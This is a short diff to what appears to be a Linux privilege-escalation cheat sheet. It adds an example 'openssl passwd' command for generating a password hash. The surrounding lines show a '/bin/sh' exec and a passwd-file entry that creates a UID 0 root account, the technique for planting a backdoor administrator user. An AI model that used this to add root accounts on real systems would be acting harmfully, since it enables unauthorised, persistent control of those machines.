@@ -178,6 +178,7 @@ exec "/bin/sh"
 ```
 Generate your hash by using openssl
 openssl passwd -1 -salt [salt] [password]
+openssl passwd -1 -salt user password (Thanks to @iilegacyyii)
 
 Adding your entry
 username:$1$new$hash:0:0:root:/root:/bin/bash
